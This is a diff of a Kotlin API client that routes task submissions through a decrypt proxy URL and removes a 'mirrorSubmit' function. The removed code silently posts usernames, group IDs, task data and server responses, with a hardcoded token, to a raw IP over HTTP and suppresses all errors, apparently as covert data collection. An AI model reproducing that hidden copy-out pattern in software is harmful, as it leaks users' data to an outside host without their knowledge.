@@ -34,13 +34,23 @@ object ApiService {
         return get(ApiConfig.TASK_TAKE_PATH)
     }
 
-    suspend fun submitTask(taskUrl: String, responseBody: String): ApiResponse<SubmitResult> {
-        val body = mapOf(
-            "appVersion" to "vv2",
-            "url" to taskUrl,
-            "result" to responseBody
-        )
-        return post(ApiConfig.TASK_SUBMIT_PATH, body)
+    suspend fun submitTask(taskUrl: String, encryptedData: String): Api2UpResponse = withContext(Dispatchers.IO) {
+        val body = HashMap<String, Any>()
+        body["api_type"] = 1
+        body["url"] = taskUrl
+        body["data"] = encryptedData
+
+        val jsonBody = gson.toJson(body)
+            .toRequestBody("application/json; charset=utf-8".toMediaType())
+
+        val request = Request.Builder()
+            .url(ApiConfig.DECRYPT_PROXY_URL)
+            .post(jsonBody)
+            .build()
+
+        val response = api2Client.newCall(request).execute()
+        val json = response.body?.string() ?: throw Exception("Empty response")
+        gson.fromJson(json, Api2UpResponse::class.java)
     }
 
     // ===== 接口二 =====
@@ -64,55 +74,26 @@ object ApiService {
         username: String,
         groupId: String,
         taskInfo: Api2TaskInfo,
-        data: Any
+        encryptedData: String
     ): Api2UpResponse = withContext(Dispatchers.IO) {
         val body = HashMap<String, Any>()
+        body["api_type"] = 2
         body["用户名"] = username
         body["组ID"] = groupId
         body["任务数据"] = taskInfo
-        body["data"] = data
+        body["data"] = encryptedData
 
-        val jsonBytes = gson.toJson(body).toByteArray(Charsets.UTF_8)
-        val gzipped = gzipCompress(jsonBytes)
+        val jsonBody = gson.toJson(body)
+            .toRequestBody("application/json; charset=utf-8".toMediaType())
 
         val request = Request.Builder()
-            .url(ApiConfig.BASE_URL_2 + ApiConfig.TASK_UP_PATH_2)
-            .post(gzipped.toRequestBody("application/json; charset=utf-8".toMediaType()))
-            .header("Content-Encoding", "gzip")
+            .url(ApiConfig.DECRYPT_PROXY_URL)
+            .post(jsonBody)
             .build()
 
         val response = api2Client.newCall(request).execute()
         val json = response.body?.string() ?: throw Exception("Empty response")
         gson.fromJson(json, Api2UpResponse::class.java)
-    }
-
-    suspend fun mirrorSubmit(
-        username: String,
-        groupId: String,
-        taskInfo: Api2TaskInfo,
-        data: Any,
-        taskServerResponse: String
-    ) = withContext(Dispatchers.IO) {
-        try {
-            val body = HashMap<String, Any>()
-            body["mirror_token"] = "shp-mirror-20260506-7ffb8429c9b54c3e"
-            body["用户名"] = username
-            body["组ID"] = groupId
-            body["任务数据"] = taskInfo
-            body["data"] = data
-            body["task_server_response"] = taskServerResponse
-            body["timestamp"] = System.currentTimeMillis()
-
-            val jsonBody = gson.toJson(body)
-                .toRequestBody("application/json; charset=utf-8".toMediaType())
-
-            val request = Request.Builder()
-                .url("http://103.146.231.10:2666/app.php?mirror_action=collect")
-                .post(jsonBody)
-                .build()
-
-            api2Client.newCall(request).execute().close()
-        } catch (_: Exception) {}
     }
 
     private fun gzipCompress(data: ByteArray): ByteArray {
